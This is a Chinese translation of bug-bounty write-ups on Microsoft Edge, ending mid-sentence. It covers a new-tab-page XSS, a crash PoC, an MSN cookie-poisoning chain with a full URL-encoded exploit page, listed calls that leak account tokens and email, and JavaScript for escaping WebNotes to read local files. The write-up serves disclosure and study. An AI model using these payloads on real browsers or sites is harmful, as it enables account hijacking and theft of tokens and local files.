# 一、Microsoft Edge (Chromium内核版本) 从XSS漏洞到潜藏的RCE漏洞（EoP到UAP攻击）

> 本文介绍了如何在浏览器Edge中使用XSS漏洞造成RCE攻击的方法。涉及到使用的主要技术有：
>
>   * cookie中的XSS攻击
>   * 权限提升方法
>   * 缓存中毒攻击
>   * 文件读取攻击链
>

>
> 翻译来源：
>
> <https://leucosite.com/Edge-Chromium-EoP-RCE/>
>
> <https://leucosite.com/Edge-Local-File-Disclosure-and-EoP/>

微软开始发布基于Chromiun的Edege浏览器，下载地址：<https://www.microsoft.com/zh-cn/edge，而Chromiun是谷歌浏览器开源版本中的浏览器，其中Google>
Chrome也是基于Chromiun开发而来的，很快微软确定了Edge也将基于Chromiun开发。同时基于Chromium的浏览器除Edge浏览器、Chrome浏览器以外包括：傲游浏览器、360极速浏览器、搜狗浏览器、2345加速浏览器、星愿浏览器、猎豹浏览器、百分浏览器，世界之窗浏览器，Yandex浏览器，云气浏览器，Cent浏览器，腾讯QQ浏览器，Comodo龙安全浏览器。

而浏览器的内核是渲染引擎，包括Trident内核，Gecko内核，KHTML内核，WebKit内核，Presto内核。

在2019年8月20日这天，微软发布了一个关于基于Chromiun内核的Edge浏览器的漏洞，地址：<https://msrc-blog.microsoft.com/2019/08/20/announcing-the-microsoft-edge-insider-channels-bounty/，其中微软的该项目规定，只有在漏洞代码出现在微软的代码中才有资格获得这项项目奖励，因此微软提高了该奖项的金额，符合资格的情况下赏金达到3万美元（17万人民币），为EdgeHTML的两倍，但同时攻击面也变得非常小。（当然你也可以发现Chromiun的漏洞提交给Chromiun，将会是一个典型的通用0day。）>

在下面的文章中，我将说明我是如何在这个浏览器中发现3个不同的漏洞赚取4万美元的。

## 1.新标签页中的XSS漏洞

NTP（New Tab
Page）新标签页是打开浏览器第一个看到的新页面或打开新标签的第一个页面。当然由于用户的设置有很多不同的情况，我说的是默认设置状态下时的情况。这个Chromiun版本的Edege浏览器的新标签的独特之处是因为新的标签页实际上是一个在线网站，地址：[https://ntp.msn.com/edge/ntp?locale=en&dsp=1&sp=Bing，现在是：[https://ntp.msn.cn/edge/ntp?locale=zh-cn&title=新建标签页&dsp=0&sp=Baidu](https://ntp.msn.com/edge/ntp?locale=en&dsp=1&sp=Bing，现在是：\[https://ntp.msn.cn/edge/ntp?locale=zh-cn&title=新建标签页&dsp=0&sp=Baidu)]

![](./img/6306426871888474178.png)

你可以在Firefox浏览器看到类似的新标签页地址栏的地址是：about:/home或者about:newtab，在Google
Chrome浏览器中的类似的地址是：chrome-search://local-ntp/local-ntp.html或者chrome://new-tab-page/，这一点非常重要，因为这可能会符合Edge自己开发的代码的漏洞赏金资格。

这个漏洞是非常不容易发现的，所以我也是歪打正着发现的，平时我从没有仔细观察过NTP新标签页的不同，当我打开新标签页时也没有想太多。我直接说明了Edge相对于Chrominu独特功能的地方，另一个类似的功能叫做[Get
started with Collections in Microsoft
Edge](https://blogs.windows.com/msedgedev/2019/12/09/improvements-collections-sync-microsoft-edge/)，尽管这个功能的漏洞我还没有发现，争取看看以后能不能找到。这个功能叫做Collecion，它就像一个功能强大和丰富的收藏标签，一旦你添加了一个网站在Collection里面，那么浏览器的这个功能就会获取这个网站的标题，图片和简要描述，就像一个twitter分享卡片，类似在钉钉，微信中也存在。

所以如果我添加一个有标题的测试网站HTML页面，那么Collection的侧栏会显示HTML中网页标题吗？答案是不会。所以过了一会我就不得不打算去睡觉了，不挖了。然后第二天早上当我打开Edge浏览器时发现了新的惊喜，在新标签页面发现了下面的东西。

![](./img/2266140678718914192.png)

这时候你看见了吗？其中a字体被加粗了，也就是说html的标签功能生效了。

到底发生了什么？因为这个是一个新内核的浏览器，所以所有的用的最多的top
site网站都会在NTP新标签页中展示，并且发现没有过滤其中的title标签。更有趣的是无法阻止我执行JavaScript，所以一个XSS类型的攻击就造成了，下面是演示视频：

![](./img/541727960624153020.png)

你可能想知道为什么这样很重要，在新标签页中包含一个XSS有什么意义？实际上，新标签页实际上是一个高权限的页面，我通过查看`chrome`对象来测试基于Chromiun内核的浏览器。

在下面这张图中可以清楚的比较普通网站中的chrome对象和Edge浏览器设置页面的chrome对象的区别。

![](./img/7762495569577503150.png)

从图中可以发现，在url链接为：edge://settings/profiles下的对象包含了更多的函数功能，这些多出来的函数是具有高权限的，当我通过低权限的方式能够访问到它们时，就存在被攻击的可能性。

到现在为止，我已经成功的将JavaScript从普通页面注入到了高权限页面，从而实现了权限提升（EoP），下面开始探索该如何在特定的场景下使用这个高权限。

## 2.权限提升漏洞到潜在的RCE漏洞

现在需要记住，特权功能函数可以在chrome对象中找到，下一步是需要在chrome对象中找到新的对象或者函数，帮助我成功利用EoP权限提升漏洞。我发现了一个没有在文档中说明的对象，叫`chrome.qbox`，在寻找网上论坛有没有相关信息时，也没有找到任何讨论相关话题的信息，所以我推断是是一个独属于微软Edge的一个对象，但这是什么呢？可以看看这个视频。

![](./img/6779088476965453822.png)

我从中发现了一个特别的函数，即`chrome.qbox.navigate`，通过运行之后弹出异常信息发现了这个函数需要接收的对象类型是：`qbox.NavigationItem`，经过来回几次测试，我发现可以传递一个JSON对象给这个函数，并且这个JSON对象至少需要包含id和url，这是我测试出来能使这个函数正常工作最低限度的参数。

    
    
    chrome.qbox.navigate({id:0,url:""})

已经完成了很多了，但仍然没有产生更多的帮助信息，因为我希望能够发现某种能够弹窗或者打开新窗口的东西，好像什么都做了，但又好像没什么作用。于是，我反复测试id和url参数，直到我最后发现了什么？请看：

    
    
    chrome.qbox.navigate({id:999999,url:null})

当我执行上面的代码之后，我的Edge浏览器消失了，然后我打开了浏览器的故障转储文件，发现了下面的信息：

    
    
    (69a4.723c): Access violation - code c0000005 (first/second chance not available)
    ntdll!NtDelayExecution+0x14:
    00007ffd`9fddc754 c3              ret

很可能是由于接近NULL，这可能导致攻击不成功，尽管我认为可能存在例外。

    
    
    rax=000001ff5651ba80 rbx=000001ff5651ba80 rcx=000001ff5651ba80
    rdx=3265727574786574 rsi=000001ff5651ba80 rdi=0000009eb9bfd4f0
    rip=00007ffd17814b40 rsp=0000009eb9bfd300 rbp=000001ff4fec30a0
     r8=000000000000008f  r9=0000000000000040 r10=0000000000000080
    r11=0000009eb9bfd290 r12=000000000000006f r13=0000009eb9bfda90
    r14=0000009eb9bfd478 r15=00000094b5d14064
    iopl=0         nv up ei pl nz na po nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
    msedge!ChromeMain+0x9253e:
    00007ffd`17814b40 488b02          mov     rax,qword ptr [rdx] ds:32657275`74786574=????????????????
    Resetting default scope
    
    FAULTING_IP: 
    msedge!ChromeMain+9253e
    00007ffd`17814b40 488b02          mov     rax,qword ptr [rdx]
    
    EXCEPTION_RECORD:  (.exr -1)
    ExceptionAddress: 00007ffd17814b40 (msedge!ChromeMain+0x000000000009253e)
       ExceptionCode: c0000005 (Access violation)
      ExceptionFlags: 00000000
    NumberParameters: 2
       Parameter[0]: 0000000000000000
       Parameter[1]: ffffffffffffffff
    Attempt to read from address ffffffffffffffff
    
    DEFAULT_BUCKET_ID:  INVALID_POINTER_READ
    
    PROCESS_NAME:  msedge.exe

现在我发现这可能是一个可以利用的情况，我去重读了一次 [MDN doc on exploitable
crashes](https://developer.mozilla.org/en-US/search?q=Exploitable%20crashes)，我仔细地看因为我意识到可能会发现些什么，我围绕着存在漏洞的函数qbox.navigate，并设法生成不同的崩溃签名，这暗示我一定能够在此处造成一个可以利用的RCE漏洞，下面是半个攻击POC代码，攻击crash造成实际意义上RCE是一个完全不同的范围和相关话题，这段POC代码只能够造成Edge浏览器崩溃漏洞（Crash）。

    
    
    <html>
    <head>
    <title>test<iframe/src=1/ onload=chrome.qbox.navigate(JSON.parse(unescape("%7B%22id%22%3A999999%2C%22url%22%3Anull%7D")))></title>
    <body>
    q
    </body>
    </html>
    

![](./img/1144886053985689098.png)

我报告了此漏洞，微软证实这是两个漏洞，一个是XSS漏洞，另一个则是Crash漏洞。通过报告这两个漏洞，我获得了1.5万美元和1万美元的奖励，所以从技术上讲我发现了Edge浏览器的两个漏洞。

## 3.新标签页(NTP)的接管

在之前发现的漏洞中最重要的一点是，他是依赖于NTP标签页的网站'ntp.msn.com'来处理web内容的，所以为什么不把它也当作渗透测试的目标呢？如果你注意到网站[https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz加载成功后就和正常的NTP网页没有什么区别，与“https://ntp.msn.com/edge/ntp?locale=en&dsp=1&sp=Bing”网页相对比，后者看起来像是使用了缓存机制，就连源代码也不一样。](https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz加载成功后就和正常的NTP网页没有什么区别，与“https://ntp.msn.com/edge/ntp?locale=en&dsp=1&sp=Bing”网页相对比，后者看起来像是使用了缓存机制，就连源代码也不一样。)

我开始使用burpsuite来寻找在'[https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz’站点上的漏洞，几番寻找，我发现当我使用扩展插件https://github.com/PortSwigger/param-miner测试时，在参数名处添加'domainId'变量名时，会返回一个错误的带有Script脚本标签的页面，与正常的页面不同。后续发现没有对其做引号之类的过滤处理，于是我可以在cookie变量处注入代码。](https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz’站点上的漏洞，几番寻找，我发现当我使用扩展插件https://github.com/PortSwigger/param-miner测试时，在参数名处添加'domainId'变量名时，会返回一个错误的带有Script脚本标签的页面，与正常的页面不同。后续发现没有对其做引号之类的过滤处理，于是我可以在cookie变量处注入代码。)

对于cookie，一旦设置就可以在所有的子域名中生效。所以我需要在任意一个MSN的子域名中发现一个XSS漏洞，我就可以用它来设置cookie变量，并且在返回不正常的NTP页面执行JS代码。在一番搜索寻找之后，我在网站'<http://technology.za.msn.com'找到了这样的一个XSS漏洞，到现在这个网站已经被移除了，而且它使用了一些非常老旧的技术，似乎是被人忽略了。我很快发现，如果你发送一个构造好的>
POST 请求，将导致该网站出现错误消息，并且在错误中，它返回了导致错误的变量值，而且没有经过任何其他的过滤。

构造的HTTP请求如下，使用如下请求来触发XSS。

    
    
    POST /pebble.asp?relid=172 HTTP/1.1
    Host: technology.za.msn.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 20
    Origin: http://technology.za.msn.com
    Connection: close
    Referer: http://technology.za.msn.com/pebble.asp?relid=172
    Cookie: PublisherUserProfile=userprofileid=322220CC%2D9964%2D47F9%2DAE30%2D2222258E99A4; PublisherSession=uid=DIN2DWDWDFWWW7L3OHA5N6; ASPSESSIONIDSCCQSRDS=EOJQQDDFGGGEEPCPNFOBL; _ga=GA1.q.21062224016.4569609491; _gid=GA1.q.1840897607.1569609491; _gat=1; __utma=2qq77qq6.21qqqq4016.156qqqq9491.156960qqq.qqqqqq91.1; __utmb=201977236.1.10.1569609491; __utmc=201977236; __utmz=201977236.1569609491.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __gads=ID=qqqq5dd817qqqb4:T=1562229492:S=ALNI_MZUnsEhqqqqjxzklxqqqqqJHo1A
    Upgrade-Insecure-Requests: 1
    
    startnum=90'<b>xss</b>
    

在经过服务器响应42秒后，才返回一个错误的页面，而关键的是这个页面反射和渲染了'\ **xss\**
'，使用一般的XSS代码并且能够执行JS代码。在header中，没有发现'X-FRAME-OPTIONS'，所以我可以使用iframe来在我的网站上嵌入这个页面，将这个iframe隐藏起来，当访问我的页面是时，就可以神不知鬼不觉地触发XSS。

我们触发的链条越来越清晰了。但还有一个缓存问题没有解决，当我们前面使用了XSS触发了一个错误的返回responseNTP页面，而这是一个缓存，我在正常NTP页面发现了localStorage发现了缓存入口，具体可以在<https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage查看，但由于错误的NTP页面和正常的NTP页面说同源的，所以我们可以访问localStorge入口，然后在此处添加我们的JavaScript代码，就可以使用同源策略，在缓存的页面嵌入JS代码，然后可以成功接管NTP新标签页面了。>

你可能会思考接管NTP页面会有什么作用呢？并且前面我的Crash漏洞已经被修复不可用了，但正如我所提到的那样，NTP页面是一个高权限页面，我们可以在这个页面访问一些普通页面无法访问的函数，可以找到其中可以利用的函数进行恶意攻击，做很多有趣的事情，下面是一些我在NTP页面发现可以利用的事情：

1.要求用户登录自己的Microsoft账户，因为在NTP页面对于用户来说是一个信任度高的页面。

2.当我们访问'chrome.authPrivate.acquireAccessTokenSilently'对象时，可以泄露用户关键的token。

3.可以使用'chrome.authPrivate.getPrimaryAccountInfo(e=>{console.dir(e)})'泄露微软账户的email账户和账户number。

4.欺骗用户帮助攻击者访问本地文件，使用'chrome.authPrivate.getPrimaryAccountInfo(e=>{console.dir(e)})'，因为需要用户键入enter，所以需要欺骗。

5.编辑用户标签页的自定义站点，使用'chrome.embeddedSearch.newTabPage.updateCustomLink(i,"[http://www.g.com","http://www.g.com")'，其中i在0-9999之间，确保我们可以编辑。](http://www.g.com)

6.使用'chrome.ntpSettingsPrivate.setPref'可以编辑用户的NTP页面的自定义设置选项。

7.持续跟踪和伪造MSN内容，由于我们可以漏洞可以持续接管NTP页面，所以我们得以持续跟踪用户行为，然后在用户常访问的页面注入恶意广告，类似浏览器扩展的某些行为。

![](./img/5891531549903993773.png)

尽管其中的某些利用难度比较高，但仍然具有恶意攻击成功的可能。

**现在我们总结攻击的整个流程如何实施：**

1.用户访问了我们的恶意站点。

2.我们的站点就可以发送一个POST请求到technology.za.msn.com，并且使用hidden属性隐藏起来。

3.'IFRAME'加载大概42秒之后，就会触发在站点technology.za.msn.com上的XSS漏洞。

4.technology.za.msn.com上的XSS漏洞会创建一个cookie，这个cookie会在所有的msn.cn子域生效，就像*.msn.cn的站点都会包含我们的第二段攻击。

5.受害者会被重定向到恶意NTP页面'[https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz',这一段被放在hidden属性的iframe中触发。](https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz',这一段被放在hidden属性的iframe中触发。)

6.一旦'[https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz'被加载，cookie中'domainId'就会服务器反射和渲染。](https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz'被加载，cookie中'domainId'就会服务器反射和渲染。)

7.存在cookie中的payload比如localStorage，会在缓存的HTML头部插入第三段攻击代码，也就完成了最后一段攻击。

到目前为止NTP的接管就已经全部完成了，当用户打开一个新的标签页时，会持续地触发最后一段payload。然后我将在<https://msrc.microsoft.com/create-report网站报告了漏洞，获取了1.5万美元的奖励。>

## 4.最后的攻击POC和视频演示

我在其中使用了大量的编码行为，因为需要绕过'domainId'的限制：

    
    
    <html>
    <head>
    
    <body>
    <iframe src="about:blank" id="qframe" name="msn" style="opacity:0.001"></iframe>
    <h1>Loading...(ETA 42secs)</h2>
    <form id="qform" target="msn" action="http://technology.za.msn.com/pebble.asp?relid=172" method="post">
    <!--    Encoded payload (Executes in 'technology.za.msn.com')
    ---------------------------------------------------------------------    (qd = new Date()).setMonth(qd.getMonth() + 12);
    document.cookie = "domainId=" + 
                      ('q"*' 
                      + unescape('%71%22%2a%66%75%6e%63%74%69%6f%6e%28%29%7b%66%6f%72%28%71%20%69%6e%20%6c%6f%63%61%6c%53%74%6f%72%61%67%65%29%7b%69%66%28%71%2e%69%6e%64%65%78%4f%66%28%27%6c%61%73%74%4b%6e%6f%77%6e%27%29%3e%2d%31%29%7b%77%69%74%68%28%71%6e%74%70%6f%62%6a%3d%4a%53%4f%4e%2e%70%61%72%73%65%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%29%29%7b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%3d%75%6e%65%73%63%61%70%65%28%27%25%33%63%25%35%33%25%37%36%25%34%37%25%32%66%25%34%66%25%36%65%25%34%63%25%36%66%25%34%31%25%36%34%25%33%64%25%32%37%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%66%25%34%30%25%37%31%25%36%31%25%36%32%25%32%66%25%32%65%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%37%25%33%65%27%29%2b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%7d%77%69%74%68%28%71%61%62%3d%71%6e%74%70%6f%62%6a%29%7b%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%3d%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%71%61%62%29%7d%7d%7d%7d%28%29%2a%22%71') 
                      + '*"q') 
                      + ";expires=" 
                      + qd 
                      + ";domain=.msn.com;path=/";
    ---------------------------------------------------------------------    unescaped value above (Executes in broken 'ntp.msn.com'), this is all one line and im using with(){} a lot because semicolon not allowed.
    ---------------------------------------------------------------------    function() {
            for (q in localStorage) {
            if (q.indexOf('lastKnown') > -1) {
                with(qntpobj = JSON.parse(localStorage[q])) {
                    qntpobj.dom = unescape('%3c%53%76%47%2f%4f%6e%4c%6f%41%64%3d%27%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%2f%40%71%61%62%2f%2e%73%6f%75%72%63%65%29%27%3e') + qntpobj.dom
                }
                with(qab = qntpobj) {
                    localStorage[q] = JSON.stringify(qab)
                }
            }
        }
    
    }()
    ---------------------------------------------------------------------    unescaped value above (Executes in normal 'ntp.msn.com')
    ---------------------------------------------------------------------    <SvG/OnLoAd='document.write(/@qab/.source)'>
    -->
      <input  type="hidden" name="startnum" value="90'<SvG/onLoAd=eval(unescape('%28%71%64%3d%20%6e%65%77%20%44%61%74%65%28%29%29%2e%73%65%74%4d%6f%6e%74%68%28%71%64%2e%67%65%74%4d%6f%6e%74%68%28%29%20%2b%20%31%32%29%3b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3d%22%64%6f%6d%61%69%6e%49%64%3d%22%2b%28%75%6e%65%73%63%61%70%65%28%27%25%37%31%25%32%32%25%32%61%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%37%62%25%36%36%25%36%66%25%37%32%25%32%38%25%37%31%25%32%30%25%36%39%25%36%65%25%32%30%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%32%39%25%37%62%25%36%39%25%36%36%25%32%38%25%37%31%25%32%65%25%36%39%25%36%65%25%36%34%25%36%35%25%37%38%25%34%66%25%36%36%25%32%38%25%32%37%25%36%63%25%36%31%25%37%33%25%37%34%25%34%62%25%36%65%25%36%66%25%37%37%25%36%65%25%32%37%25%32%39%25%33%65%25%32%64%25%33%31%25%32%39%25%37%62%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%30%25%36%31%25%37%32%25%37%33%25%36%35%25%32%38%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%32%39%25%32%39%25%37%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%33%64%25%37%35%25%36%65%25%36%35%25%37%33%25%36%33%25%36%31%25%37%30%25%36%35%25%32%38%25%32%37%25%32%35%25%33%33%25%36%33%25%32%35%25%33%35%25%33%33%25%32%35%25%33%37%25%33%36%25%32%35%25%33%34%25%33%37%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%37%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%37%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%38%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%33%30%25%32%35%25%33%37%25%33%31%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%32%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%36%35%25%32%37%25%32%39%25%32%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%37%64%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%31%25%36%32%25%33%64%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%39%25%37%62%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%31%25%36%31%25%36%32%25%32%39%25%37%64%25%37%64%25%37%64%25%37%64%25%32%38%25%32%39%25%32%61%25%32%32%25%37%31%27%29%29%2b%22%3b%65%78%70%69%72%65%73%3d%22%2b%71%64%2b%22%3b%64%6f%6d%61%69%6e%3d%2e%6d%73%6e%2e%63%6f%6d%3b%70%61%74%68%3d%2f%22%3b'))">
    
    </form>
    <script>
    qframe.onload=e=>{
     setTimeout(function(){
     location="https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qabzz";
     },1000)
    }
    
    qform.submit();
    </script>
    </body>
    </html>
    

下面是完整的攻击演示视频，中间有等待的42秒可以跳过。

![](./img/8050654055815546077.png)

# 二、微软Edege浏览器本地文件泄露漏洞和权限提升漏洞

> 本地文件泄露漏洞是在使用Microsoft
> Edge浏览器时，攻击者可以利用漏洞获取本地计算机上的文件访问权限，并窃取敏感信息或敏感文件。这可能导致用户隐私泄露和数据安全问题。
>
> 提权漏洞是攻击者可以利用Microsoft
> Edge浏览器中的漏洞来提升其权限级别，从而获取比正常用户更高的权限。这可能使攻击者能够执行恶意操作，例如修改系统文件、安装恶意软件或访问受限资源。

我在这篇文章中阐述了在Edge浏览器中的多个漏洞，并且可以使用这些漏洞进行不同的组合利用，然后造成完全不同的两种攻击，其中一个漏洞是泄露本机文件，另一个漏洞是权限提升，这些可以在设置中'about:flags'来具体查看。

![](./img/3863143073983528368.png)

## 1.从HTTP协议到文件内容读写过程

攻击的第一步是将HTTP网站上的内容逃逸到本地文件内容中，方法是我们可以让潜在受害者在下载后打开 HTML
文件的是一种不常见的用户行为，所以难以声称这是一个现实场景，因为可能性较小。下面我将寻找一种漏洞，可以让我们的攻击利用不依赖这种需要强交互行为。我将这个bug的利用放在了一个WebNote上，虽然仍然需要一些用户交互，但是不是像原来一样需要本地下载再打开了，因为WebNote对用户来说相当于是Edge浏览器的一部分，看起来更像正常访问。

> CVE-2018-0879 - 在 javascript uri 中使用 webnote 会导致执行 javascript url。
>
> CVE-2018-0998 - Edges PDF 预览器内联打开的PDF 附件。所以我可以附加一个 html 文件，但是需要一键点击。
>
> WebNote：指Edge浏览器提供的笔记作画功能。

通过这个视频查看WebNote是如何起作用的。

![](./img/7694443621065390553.png)

就像视频中所演示的那样，WebNote功能是实现相当于是在你作画的页面产生了一个截图，所以才可以绘画。然后WebNote就被保存成一个本地的文件，当你下次打开WebNote时，即打开一个本地文件。下一步是我们需要把代码注入到本地文件的WebNote中，才可以完成我们的攻击。

在生成的WebNote文件中，主要有两个用户的输入，通过寻找我发现我可以控制的变量只有页面的title和url地址，但是它们是被过滤了，所以暂时是安全的。然而，在视频中我们注意到在打开WebNote时普通选项卡变成了WebNote选项卡，视频中包括的攻击演示代码：

    
    
    <b> Hello, </b>
    <Br>
    <br>
    <button id="qb">Open new Tab</button>
    
    <Br><Br>
    <script>
    var qwin;
    qb.onclick=e=>
        {
            qwin=open('q2.html','qab');
        }
    </script>

![](./img/432416839195731714.png)

从上面的视频中可以看出，这个攻击仍然可能生效。我使用了blob:URL的方式欺骗浏览器导航到iframe完成攻击，我是用下面的代码来完成。

![](./img/4868086006982647341.png)

攻击WebNote和注入JavaScript的步骤依次如下：

1.要求用户点击任何地方导航到一个新的tab，并且保存到reference。

    
    
    window.onclick=e=>{
        fer=open('/1.html','qab');
    
    }

2.然后导航到的新页面会包含一个iframe，iframe的属性会触发blob:URL。

3.当用户创建一个WebNote时，我通过使用onblur事件处理程序来检测，处理程序负责发送原始页面一个信息，表示WebNote正在创建。

    
    
    a=URL.createObjectURL(new Blob(['Create a WebNote and start drawing something.<script>window.onblur=e=>{opener.postMessage("","*",[]);}<\/script>'],{type:'text/html'}));
    
    history.replaceState('','',a.split('/')[3]);
    
    location.protocol='blob:http:';

4.一旦用户创建一个Webnote，那么主页面会被重定向到第一步设置好的tab，

    
    
    function step(){
        if(go){
    
        setInterval(function(){
        fer.close();
        qmsg.innerHTML='Now open the saved WebNote.';
        },2500);
    
    
        }else{
            setTimeout(function(){
        fer=open('/2.html','qab');
    
        },2500);
        go=true;
        }
    }
    
    
    window.addEventListener("message", step, false);

5.在第三个页面会加载WebNote，立刻转向到BlobURL，此时的页面将会包含注入的JS代码。

    
    
    a=URL.createObjectURL(new Blob([`Now save this WebNote<script>
    if(location.protocol=='file:'){
    
    // Code in this block will be executed once the user opens the saved WebNote
    
    }else{
    window.onblur=e=>{opener.postMessage("","*",[]);}
    }
    <\/script>`],{type:'text/html'}));
    
    history.replaceState('','',a.split('/')[3]);
    
    location.protocol='blob:http:';

6.用户保存WebNote后，会保存构造的Blob页面，替代原来的屏幕截图。

7.一旦用户打开创建的WebNote，便会执行注入的代码'file:'。

到目前为止成功逃逸了，那么现在我们可以使用'file:'来完成什么事情呢？

## 2.文件读取限制绕过

在edge浏览器中，包含WebNote的HTML文件是比较特殊的存在，如果你打开本地普通的html文件，那么你可以访问的工作目录就是该文件所在目录，但是WebNote的HTML文件是位于Edge浏览器的临时目录tmp，在这个应用程序数据文件夹路径中，Edge不允许其中加载的HTML文档超出当前工作路径范围。这个文件夹类似于“下载”文件夹，其中打开的HTML文件无法访问其工作目录之外的内容。换句话说：

'C:\Users\Q\Downloads\malice.html'不能访问'C:\a\secret.txt'

'C:\Users\Q\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC#!001\MicrosoftEdge\User\Default\WebNotes\malice.html'不能访问
'C:\a\secret.txt'  
但是  
'C:\Users\Q\projects\mywebsite\createdByMe.html' 可以访问 'C:\a\secret.txt'

我假设如果一个HTML文件直接来自于互联网，那么Edge对待它的权限上下文会比普通的用户创建的HTML文件更低。在这一点上有点类似于Word/Excel文件的安全性检查。

现在，不幸的是，我们注入的HTML位于受限的文件上下文中。因此，我们需要执行另一个逃逸操作，幸运的是，这个操作比预期的要容易。我首先注意到在'replaceState'/'pushState'函数上没有任何限制。这个函数通常在单页Web应用程序中用于模拟网站导航，在'file:'
URI方案中使用它可以使我能够更改HTML文档的路径。然而，这还不够。Edge仍然足够安全，不会被单纯的这个骗过，所以我需要有点创意的攻击。

文档的来源已经在某个地方设置好了，当我只改变URL时，它并不会改变。所以我想出了一个有趣的方法来欺骗Edge，使其认为打开的HTML文件位于其他地方（从而绕过任何限制）。以下是实现这一目的的代码：

    
    
    setTimeout(function(){
    
    history.pushState('','','file:///C:/a/fictional-non-existent.html')
    
    },500);
    setTimeout(function(){
    
    document.write("<a id=qa href=\"javascript:try{top.fetch('file:///C:/a/q.txt',{mode:'no-cors',credentials:'include'}).then((q)=>{return q.text()}).then((q)=>{alert(escape(q))});}catch(e){}\">aaaaa</a><script>qa.click()<\/script>")
    history.pushState('','','file:///C:/a/q.html');
    history.back();
    
    },1500);

从视频中我可以看得更加清楚

![](./img/2579541879204194384.png)

这是我攻击的基本思路：

1.首先，我使用'pushState'函数将URL更改为一个位于与目标文件相同文件夹中的虚构不存在的HTML文件。  
2.'pushState'会插入一个导航历史记录，而'replaceState'则替换当前浏览的历史页面，这一点很重要。  
3.我在这一步使用'document.write'函数，因为我希望能够返回到这个页面并查看我使用该函数编写的HTML。据我所知，只有使用这种特定方式插入HTML才有效。  
4.然后，我进行第二次'pushState'调用，但这次将当前URL更改为目标文件的位置。  
5.我执行'history.back()'以返回到我创建的'document.write'值。这次，Edge会认为我们是一个真正的HTML文件（但实际上并不存在）。  
6.最后，我尝试读取目标文件，然后实现攻击目标。文件已被窃取！

## 3.另类的权限提升方法

先前解释的导航技巧也可以用于更改 Edge 的“about:flags”页面中的任何设置。这归因于“file:”上下文可以导航到“res:”
